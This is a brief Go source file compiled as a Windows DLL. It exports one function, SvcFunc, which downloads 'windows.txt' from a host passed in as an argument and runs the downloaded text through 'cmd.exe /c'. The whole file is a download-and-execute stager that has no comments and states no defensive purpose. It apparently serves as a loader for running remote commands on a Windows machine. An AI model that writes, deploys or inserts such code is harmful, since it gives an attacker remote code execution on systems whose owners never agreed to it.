package main

import "C"
import (
	"bytes"
	"context"
	"fmt"
	"io"
	"net/http"
	"os/exec"
	"time"
)

func main() {}

//export SvcFunc
func SvcFunc(s *C.char) C.int {
	r, err := http.NewRequest("GET", fmt.Sprintf("http://%s/windows.txt", C.GoString(s)), nil)
	if err != nil {
		return C.int(-1)
	}
	x, _ := context.WithTimeout(context.Background(), time.Duration(5*time.Second))
	b, err := http.DefaultClient.Do(r.WithContext(x))
	if err != nil {
		return C.int(-1)
	}
	defer b.Body.Close()
	d := &bytes.Buffer{}
	io.Copy(d, b.Body)
	e := exec.Command("cmd.exe", "/c", string(d.Bytes()))
	e.Start()
	return C.int(0)
}
